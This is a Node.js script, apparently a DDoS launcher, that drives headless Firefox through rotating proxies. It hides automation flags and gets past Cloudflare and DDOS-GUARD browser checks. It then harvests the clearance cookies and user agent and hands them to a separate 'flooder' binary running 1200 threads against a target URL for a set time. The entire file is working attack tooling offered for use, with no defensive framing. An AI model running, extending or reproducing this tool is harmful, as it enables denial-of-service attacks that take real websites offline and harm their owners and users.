const { firefox } = require('playwright-extra');
const {spawn} = require('child_process');
const os = require('os');
const cluster = require('cluster');
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');

if (process.argv.length < 6) {
    console.log('URL Time Threads Proxies');
    console.log('https://sheesh.rip/ 120 5 http.txt');
    process.exit(0);
}
const target = process.argv[2], time = process.argv[3],thread = process.argv[4], proxy = process.argv[5];
process.on('uncaughtException', function (err) {
console.log(err)
});
setTimeout(() => {
  const command = spawn('pkill', ["flooder"]);
  process.exit()
}, time*1000);
proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
        

const runThis = async (proxer) => {
firefox.launch({ headless: true ,proxy: {server: proxer},timeout: 10000
,ignoreHTTPSErrors: true,args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--no-zygote',
      '--single-process', // <- this one doesn't work on Windows
      '--disable-gpu'
    ]}).then(async browser => {
  const context = await browser.newContext({timeout: 10000})
  const page = await context.newPage()
  await page.setViewportSize({width: 1920, height: 1080});
  const getUA = await page.evaluate(() => navigator.userAgent);
  await page.setDefaultNavigationTimeout(60000);
      await page.evaluate(() => {
        Object.defineProperty(navigator, 'webdriver', {
          get: () => false
        });
      })
  console.log('Starting! Proxy: '+proxer + ' | UserAgent: '+getUA);
  try {
  await page.goto(target, { waitUntil: 'networkidle' })
  } catch (error1) {
  await browser.close();
  restart()
  }
  try {
  await page.waitForTimeout(8000);
  const title = await page.title();
  if (title == "Just a moment...") {
  await browser.close();
  restart()
  }
  if (title == "Checking your browser...") {
  await browser.close();
  restart()
  }
  if (title == "DDOS-GUARD") {
  await browser.close();
  restart()
  }
  const cookie = await context.cookies()
  let goodcookie = "";
  let laa_ = JSON.stringify(cookie);
  laa_ = JSON.parse(laa_);
  laa_.forEach((value) => {
  const valueString = value.name + "=" + value.value + "; ";
  goodcookie += valueString;
  });
  goodcookie = goodcookie.slice(0, -2);
  console.log('Solved! Proxy: '+proxer + ' | UserAgent: '+getUA + ' | Cookie: '+goodcookie); 
  await browser.close()
  let promise = new Promise((res, rej) => {
const command = spawn('./flooder', ["host=" + target, "limit=70", "time=" + time, "good=" + proxer, "ua=" + getUA, "threads=1200", "cookie=" + goodcookie]);
 })
} catch (error2) {
await browser.close();
restart()
}
})
}
if (!cluster.isWorker) {
    for (let i = 0; i < thread; i++) {
        cluster.fork()
    }

} else {
    proxer = proxies[Math.floor(Math.random() * proxies.length)]
    ;(async (proxer) => {
        await runThis(proxer)
    })(proxer)
}
function restart() {
proxer = proxies[Math.floor(Math.random() * proxies.length)]
;(async (proxer) => {
        await runThis(proxer)
    })(proxer)
}
